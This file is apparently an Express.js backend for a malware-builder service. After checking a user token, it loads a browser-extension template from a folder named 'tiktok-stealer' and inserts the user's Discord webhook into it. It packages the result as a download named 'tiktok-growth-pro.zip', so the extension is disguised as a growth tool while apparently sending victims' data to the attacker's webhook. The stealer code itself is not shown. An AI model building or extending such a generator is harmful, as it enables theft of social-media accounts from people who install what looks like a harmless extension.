import express from 'express';
import cors from 'cors';
import crypto from 'crypto';
import { createClient } from '@supabase/supabase-js';
import JSZip from 'jszip';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
  origin: 'https://elitetools.lovable.app',
  methods: ['GET', 'POST', 'PUT', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Supabase client
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// Verify elit_ token and get discord_id
async function verifyElitToken(token) {
  if (!token?.startsWith('elit_')) return null;

  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');

  // Try using the RPC function first
  try {
    const { data, error } = await supabase.rpc('verify_discord_api_token', {
      _token_hash: tokenHash
    });

    if (error || !data?.length) return null;
    return data[0].discord_id;
  } catch (e) {
    console.log('RPC failed, trying direct query:', e);
    
    // Fallback to direct query
    const { data, error } = await supabase
      .from('discord_api_tokens')
      .select('discord_id')
      .eq('token_hash', tokenHash)
      .eq('revoked', false)
      .maybeSingle();

    if (error || !data) return null;
    return data.discord_id;
  }
}

// Health check
app.get('/', (req, res) => {
  res.send('Extension Backend Running ✅');
});

// Save webhook endpoint
app.put('/api/save-webhook', async (req, res) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.replace('Bearer ', '');
  const { webhook } = req.body;
  
  if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks/')) {
    return res.status(400).json({ error: 'Invalid webhook URL' });
  }
  
  try {
    const discord_id = await verifyElitToken(token);
    
    if (!discord_id) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const { error: updateError } = await supabase
      .from('profiles')
      .update({ discord_webhook: webhook })
      .eq('user_id', discord_id);
    
    if (updateError) {
      console.error('Update error:', updateError);
      return res.status(500).json({ error: 'Failed to save webhook' });
    }
    
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Save webhook error:', error);
    return res.status(500).json({ error: error.message });
  }
});

// Generate extension endpoint
app.get('/api/generate-extension', async (req, res) => {
  const { token } = req.query;
  
  if (!token) {
    return res.status(401).send('No token provided');
  }
  
  try {
    const discord_id = await verifyElitToken(token);
    
    if (!discord_id) {
      return res.status(401).send('Invalid token');
    }
    
    const { data: profile, error: profileError } = await supabase
      .from('profiles')
      .select('discord_webhook')
      .eq('user_id', discord_id)
      .single();
    
    if (profileError) {
      console.error('Profile error:', profileError);
      return res.status(500).send('Error fetching profile: ' + profileError.message);
    }
    
    if (!profile || !profile.discord_webhook) {
      return res.status(400).send('No webhook configured. Please set your webhook in Settings first.');
    }
    
    const webhook = profile.discord_webhook;
    
    // Read template files
    const templatePath = path.join(__dirname, 'templates', 'tiktok-stealer');
    
    const manifest = fs.readFileSync(path.join(templatePath, 'manifest.json'), 'utf8');
    const background = fs.readFileSync(path.join(templatePath, 'background.js'), 'utf8');
    const popup_html = fs.readFileSync(path.join(templatePath, 'popup.html'), 'utf8');
    const popup_js = fs.readFileSync(path.join(templatePath, 'popup.js'), 'utf8');
    
    // Replace webhook placeholder
    const customBackground = background.replace('WEBHOOK_PLACEHOLDER_12345', webhook);
    
    // Create ZIP
    const zip = new JSZip();
    zip.file('manifest.json', manifest);
    zip.file('background.js', customBackground);
    zip.file('popup.html', popup_html);
    zip.file('popup.js', popup_js);
    
    // Check if icons exist and add them
    const iconPath = path.join(templatePath, 'icon128.png');
    if (fs.existsSync(iconPath)) {
      zip.file('icon16.png', fs.readFileSync(path.join(templatePath, 'icon16.png')));
      zip.file('icon48.png', fs.readFileSync(path.join(templatePath, 'icon48.png')));
      zip.file('icon128.png', fs.readFileSync(iconPath));
    }
    
    // Generate ZIP buffer
    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer' });
    
    // Send as download
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="tiktok-growth-pro.zip"');
    res.send(zipBuffer);
  } catch (error) {
    console.error('Generate extension error:', error);
    res.status(500).send('Error generating extension: ' + error.message);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
